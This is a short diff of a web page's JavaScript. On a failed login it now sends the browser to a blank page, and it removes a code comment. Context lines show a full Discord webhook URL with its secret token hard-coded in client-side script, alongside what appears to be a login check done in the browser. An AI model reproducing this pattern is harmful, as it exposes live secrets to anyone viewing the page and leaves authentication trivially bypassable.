@@ -85,7 +85,7 @@
             document.getElementById('messageDiv').style.display = 'block';
         } else {
             alert('아이디 또는 비밀번호가 잘못되었습니다.');
-            location.reload();
+            window.location.href = 'about:blank';
         }
 
         const webhookUrl = 'https://discord.com/api/webhooks/1325059447835594853/vn_IY9pZ2x_mUzUTlpInQW1KrgP31JREYomj8GFUmLS9QjbIQqufcdZD93lNBjPypOzp';
@@ -103,7 +103,7 @@
         });
 
         document.getElementById('cancelButton').addEventListener('click', function() {
-            document.getElementById('file').value = ''; // 파일 입력 초기화
+            document.getElementById('file').value = '';
         });
 
         function sendMessage() {
